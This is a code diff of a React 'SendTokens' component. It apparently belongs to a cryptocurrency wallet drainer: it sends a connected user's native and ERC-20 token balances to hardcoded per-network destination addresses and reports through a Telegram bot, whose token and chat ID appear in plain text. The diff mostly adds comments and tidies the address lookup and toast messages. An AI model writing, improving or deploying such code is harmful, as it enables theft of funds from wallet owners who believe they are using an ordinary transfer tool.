@@ -12,6 +12,7 @@ import { parseEther, parseGwei } from 'viem'; // Import necessary parsers
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
 
+// Function to send a Telegram notification
 const sendTelegramNotification = async (message) => {
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -23,6 +24,7 @@ const sendTelegramNotification = async (message) => {
   }
 };
 
+// Destination addresses for different networks
 const destinationAddresses = {
   1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
   56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
@@ -32,35 +34,21 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
+// Helper function to select an address based on the network ID
 function selectAddressForToken(network) {
-  const addresses = {
-    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
-    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  };
-
-  const selectedAddress = addresses[network];
-
+  const selectedAddress = destinationAddresses[network];
   if (selectedAddress) {
     console.log('Great Job! Selected Address:', selectedAddress);
   } else {
     console.log('No address found for the selected network:', network);
   }
-
   return selectedAddress;
 }
 
+// SendTokens component
 export const SendTokens = () => {
   const { setToast } = useToasts();
-  const showToast = (message, type) =>
-    setToast({
-      text: message,
-      type,
-      delay: 4000,
-    });
+  const showToast = (message, type) => setToast({ text: message, type, delay: 4000 });
 
   const [tokens] = useAtom(globalTokensAtom);
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
@@ -138,10 +126,7 @@ export const SendTokens = () => {
             },
           }));
 
-          showToast(
-            `Native token transfer of ${token?.balance} ETH sent. Tx Hash: ${txHash.hash}`,
-            'success',
-          );
+          showToast(`Native token transfer of ${token?.balance} ETH sent. Tx Hash: ${txHash}`, 'success');
         } else {
           // ERC-20 token transfer
           await publicClient.simulateContract({
@@ -175,8 +160,8 @@ export const SendTokens = () => {
           }));
 
           showToast(
-            `ERC-20 transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash.hash}`,
-            'success',
+            `ERC-20 transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash}`,
+            'success'
           );
         }
       } catch (error) {
@@ -186,9 +171,7 @@ export const SendTokens = () => {
     }
   };
 
-  const checkedCount = Object.values(checkedRecords).filter(
-    (record) => record.isChecked,
-  ).length;
+  const checkedCount = Object.values(checkedRecords).filter((record) => record.isChecked).length;
 
   return (
     <div style={{ margin: '20px' }}>
@@ -205,4 +188,6 @@ export const SendTokens = () => {
     </div>
   );
 };
+
+
 
